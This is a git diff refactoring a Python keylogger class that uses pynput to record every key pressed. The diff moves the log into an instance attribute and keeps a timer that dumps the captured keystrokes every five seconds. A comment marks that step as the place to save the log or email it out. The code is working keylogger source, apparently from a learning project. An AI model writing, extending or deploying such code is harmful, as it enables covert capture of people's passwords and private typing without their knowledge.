@@ -3,24 +3,28 @@
 import pynput.keyboard as pynkey
 import threading
 
-log = ""
-
 
 class Keylogger:
+    def __init__(self):
+        print('constr method')
+        self.log = ""
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
     def process_key_press(self, key):
-        global log
         try:
-            log += str(key.char)
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                log += " "
+                current_key = " "
             else:
-                log += " " + str(key) + " "
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
 
     def report(self):
-        global log
-        print(log)  # Place for reporting the log. Either saving to file or sending by email.
-        log = ""
+        print(self.log)  # Place for reporting the log. Either saving to file or sending by email.
+        self.log = ""
         timer = threading.Timer(5, self.report)
         timer.start()
 
